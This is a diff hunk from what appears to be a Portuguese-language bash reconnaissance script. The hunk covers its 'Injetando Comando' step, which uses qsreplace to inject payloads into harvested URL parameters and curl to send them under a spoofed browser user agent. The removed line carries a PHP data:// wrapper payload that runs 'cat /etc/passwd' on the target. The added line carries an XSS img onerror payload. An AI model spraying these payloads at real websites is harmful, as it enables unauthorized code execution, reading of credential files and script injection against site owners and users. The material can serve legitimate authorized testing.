@@ -39,6 +39,6 @@ fdupes -N -d . 1>/dev/null
 echo "Analisando Arquivos Json"
 retire -j --colors | tee -a vulnerabilidades2-js 
 echo "Injetando Comando"
-cat parametros_files | qsreplace "data://text/plan,%3c?php%20system('cat%20/etc/passwd')%20?%3e" > injetando.txt
-for a in $(cat injetando.txt); do curl -s -q -A "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0" $a;done | grep -v "<"  
+cat parametros_files | qsreplace "<img src=1 onerror=alert(1)>" > injetando.txt
+for a in $(cat injetando.txt); do curl -s -q -A "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0" $a;done   
 echo "Fim do Recon"
